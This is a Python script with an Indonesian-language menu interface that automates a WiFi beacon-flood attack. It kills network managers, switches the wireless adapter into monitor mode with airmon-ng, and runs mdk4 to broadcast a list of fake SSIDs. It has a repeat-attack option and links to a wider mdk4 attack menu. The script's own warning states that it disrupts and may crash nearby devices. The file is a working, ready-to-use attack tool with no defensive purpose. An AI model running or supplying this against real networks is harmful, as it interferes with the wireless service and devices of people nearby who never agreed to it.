#!/usr/bin/env python3
import csv
import glob
import os
import random
import re
import subprocess
import sys
import tempfile
import time
import signal

# ---------- ANSI ----------
RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR = "\033[2J\033[H"

COLORS = {
    "green": "\033[92m",
    "red": "\033[91m",
    "cyan": "\033[96m",
    "yellow": "\033[93m",
    "magenta": "\033[35m",
    "gray": "\033[90m",
}

GREEN = COLORS["green"]
RED = COLORS["red"]
CYAN = COLORS["cyan"]
YELLOW = COLORS["yellow"]
MAGENTA = COLORS["magenta"]
GRAY = COLORS["gray"]

BOX_WIDTH = 40

# ================= CLEAR SCREEN =================

def clear_screen():
    sys.stdout.write(CLEAR)
    sys.stdout.flush()

# ================= DRAW BOX =================

def draw_box_top(color=CYAN):
    print(f"\n  {color}{BOLD}╔{'═' * BOX_WIDTH}╗{RESET}")

def draw_box_bottom(color=CYAN):
    print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")

def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
    inner = f" {title}"
    pad = BOX_WIDTH - len(inner)
    if pad < 0:
        inner = inner[:BOX_WIDTH]
        pad = 0
    print(
        f"  {color}{BOLD}║{RESET}"
        f"{text_color}{BOLD}{inner}{RESET}"
        f"{' ' * pad}"
        f"{color}{BOLD}║{RESET}"
    )

# ================= LOADING =================

def loading(text, duration=1):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(duration * 10):
        sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

def loading_with_text(text, duration=2):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    glitch_chars = "!@#$%^&*"
    
    for i in range(duration * 10):
        display_text = ""
        for char in text:
            if char == " ":
                display_text += " "
            elif random.random() < 0.1:
                display_text += random.choice(glitch_chars)
            else:
                display_text += char
                
        sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}{display_text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

# ================= GLITCH FUNCTIONS =================

def glitch_print(text, color=GREEN, cycles=8):
    chars = "!@#$%^&*<>/\\|~?"
    n = len(text)
    revealed = [False] * n
    
    for c in range(cycles):
        display = []
        for i, ch in enumerate(text):
            if ch == " ":
                display.append(" ")
                continue
            if revealed[i]:
                display.append(ch)
            else:
                if random.random() < (c / cycles):
                    revealed[i] = True
                    display.append(ch)
                else:
                    display.append(random.choice(chars))
        sys.stdout.write(f"\r  {color}{''.join(display)}{RESET}")
        sys.stdout.flush()
        time.sleep(0.04)
    
    print(f"\r  {color}{text}{RESET}")

# ================= WIRELESS FUNCTIONS =================

def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces

def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"

def run_command(cmd, show_output=False):
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return result

def start_monitor_mode(adapter):
    loading_with_text(f"Mengaktifkan monitor mode pada {adapter}...", 2)
    run_command(["sudo", "airmon-ng", "check", "kill"], show_output=False)
    result = run_command(["sudo", "airmon-ng", "start", adapter], show_output=False)
    
    if result is None:
        return adapter

    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(0.3)
    return monitor_iface

def stop_monitor_mode(monitor_iface):
    loading("Membersihkan monitor mode...", 1)
    
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        result = run_command(["sudo", "airmon-ng", "stop", name], show_output=False)
        if result is not None:
            break

    run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)

def get_ssid_file_path():
    """Mencari file ssid_list.txt di folder ssid-fake"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    possible_paths = [
        os.path.join(script_dir, "ssid-fake", "ssid_list.txt"),
        os.path.join(script_dir, "ssid_list.txt"),
        os.path.join(os.path.dirname(script_dir), "ssid-fake", "ssid_list.txt"),
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return path
    
    return None

def get_monitor_interface():
    """Mendapatkan interface monitor yang aktif atau membuatnya dari wlan0"""
    ifaces = get_wireless_interfaces()
    for iface in ifaces:
        if iface.endswith("mon"):
            return iface
    
    for iface in ifaces:
        if iface.startswith("wlan"):
            return start_monitor_mode(iface)
    
    return start_monitor_mode("wlan0")

# ================= MENU =================

def main_menu():
    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("MDK4 BEACON FLOOD", CYAN, YELLOW)
    draw_box_bottom(CYAN)
    
    print(f"\n  {BOLD}Pilih opsi:{RESET}")
    print(f"  {GREEN}1.{RESET} START")
    print(f"  {GREEN}2.{RESET} BACK")
    print()
    print(f"  {YELLOW}{'=' * 40}{RESET}")
    print()
    
    while True:
        choice = input(f"  {YELLOW}>> pilihan : {RESET}").strip()
        if choice == "1":
            return "start"
        elif choice == "2":
            return "back"
        else:
            print(f"  {RED}[!] Pilih 1 atau 2.{RESET}")

def show_warning():
    clear_screen()
    draw_box_top(RED)
    draw_box_title("⚠️  PERINGATAN  ⚠️", RED, YELLOW)
    draw_box_bottom(RED)
    
    print(f"\n  {YELLOW}{BOLD}Ini akan melakukan SPAM BEACON WIFI!{RESET}")
    print(f"  {YELLOW}{BOLD}Akan membanjiri area dengan SSID palsu!{RESET}")
    print()
    print(f"  {RED}Efek yang mungkin terjadi:{RESET}")
    print(f"  {GRAY}- Memenuhi daftar WiFi yang terdeteksi{RESET}")
    print(f"  {GRAY}- Mengganggu perangkat di sekitar{RESET}")
    print(f"  {GRAY}- Bisa menyebabkan crash pada perangkat tertentu{RESET}")
    print()
    print(f"  {YELLOW}Lanjutkan? (y/n){RESET}")
    
    while True:
        choice = input(f"  {YELLOW}>> : {RESET}").strip().lower()
        if choice in ['y', 'yes']:
            return True
        elif choice in ['n', 'no']:
            return False
        else:
            print(f"  {RED}[!] Ketik y atau n.{RESET}")

def back_to_mdk4_menu():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    menu_path = os.path.join(script_dir, "mdk4-menu.py")
    
    possible_paths = [
        menu_path,
        os.path.join(script_dir, "..", "mdk4-menu.py"),
        os.path.join(script_dir, "..", "..", "mdk4-menu.py"),
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            os.execvp(sys.executable, [sys.executable, path])
            return
    
    print(f"\n  {RED}[✗] mdk4-menu.py tidak ditemukan.{RESET}")
    input("\n  Tekan Enter untuk kembali...")
    sys.exit(0)

def run_beacon_attack(monitor_iface):
    ssid_file = get_ssid_file_path()
    if not ssid_file:
        clear_screen()
        draw_box_top(RED)
        draw_box_title("ERROR", RED, YELLOW)
        draw_box_bottom(RED)
        print(f"\n  {RED}[✗] ssid_list.txt tidak ditemukan!{RESET}")
        print(f"  {YELLOW}Pastikan file ada di: ssid-fake/ssid_list.txt{RESET}")
        input("\n  Tekan Enter untuk kembali...")
        return

    clear_screen()
    draw_box_top(RED)
    draw_box_title("🔥 SPAM BEACON AKTIF 🔥", RED, YELLOW)
    draw_box_bottom(RED)
    
    print(f"\n  {GREEN}{BOLD}  SPAM BEACON AKTIF, CHECK WIFI MU{RESET}")
    print()
    print(f"  {GRAY}SSID file: {ssid_file}{RESET}")
    print(f"  {GRAY}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
    
    mdk4_cmd = [
        "sudo", "mdk4", monitor_iface, "b",
        "-f", ssid_file,
        "-w", "a",
        "-m",
        "-s", "500"
    ]
    
    try:
        proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Animasi spinner selama serangan berjalan
        chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        i = 0
        while proc.poll() is None:
            sys.stdout.write(f"\r  {RED}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}SPAM BEACON ACTIVE... Press Ctrl+C to stop{RESET}")
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
        
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[!] Menghentikan serangan...{RESET}")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
        time.sleep(0.5)

def prompt_post_attack():
    print(f"\n  {BOLD}Pilih opsi:{RESET}")
    print(f"  {GREEN}1.{RESET} Attack Again")
    print(f"  {GREEN}0.{RESET} Back to Menu")
    print(f"  {GREEN}99.{RESET} Exit")
    
    while True:
        choice = input(f"\n  {YELLOW}>> pilihan : {RESET}").strip()
        if choice == "1":
            return "again"
        elif choice == "0":
            return "menu"
        elif choice == "99":
            return "exit"
        else:
            print(f"  {RED}[!] Pilih 1, 0, atau 99.{RESET}")

# ================= MAIN =================

def main():
    monitor_iface = None
    
    while True:
        try:
            choice = main_menu()
            
            if choice == "back":
                back_to_mdk4_menu()
            
            elif choice == "start":
                # Warning
                if not show_warning():
                    continue
                
                # Auto detect interface
                clear_screen()
                draw_box_top(CYAN)
                draw_box_title("MDK4 BEACON FLOOD", CYAN, YELLOW)
                draw_box_bottom(CYAN)
                
                print(f"\n  {YELLOW}[*] Mencari interface monitor...{RESET}")
                monitor_iface = get_monitor_interface()
                glitch_print(f"MONITOR INTERFACE: {monitor_iface}", CYAN)
                time.sleep(0.5)
                
                # Jalankan serangan
                run_beacon_attack(monitor_iface)
                
                # Menu setelah serangan
                while True:
                    post_choice = prompt_post_attack()
                    if post_choice == "again":
                        # Cleanup lalu restart attack
                        stop_monitor_mode(monitor_iface)
                        monitor_iface = None
                        break
                    elif post_choice == "menu":
                        stop_monitor_mode(monitor_iface)
                        back_to_mdk4_menu()
                    elif post_choice == "exit":
                        stop_monitor_mode(monitor_iface)
                        clear_screen()
                        print(f"\n  {GREEN}[✓] Terima kasih!{RESET}")
                        sys.exit(0)
                
        except KeyboardInterrupt:
            print(f"\n  {YELLOW}[!] Dibatalkan oleh user{RESET}")
            if monitor_iface:
                stop_monitor_mode(monitor_iface)
            sys.exit(0)

if __name__ == "__main__":
    main()